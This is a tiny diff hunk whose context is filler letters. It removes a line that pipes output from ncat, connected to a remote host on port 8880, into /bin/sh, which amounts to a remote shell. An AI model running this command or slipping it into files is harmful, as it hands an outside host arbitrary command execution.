@@ -12,6 +12,4 @@ f
 f
 f
 f
-f 
-d
-ncat too.cat 8880 | /bin/sh
+
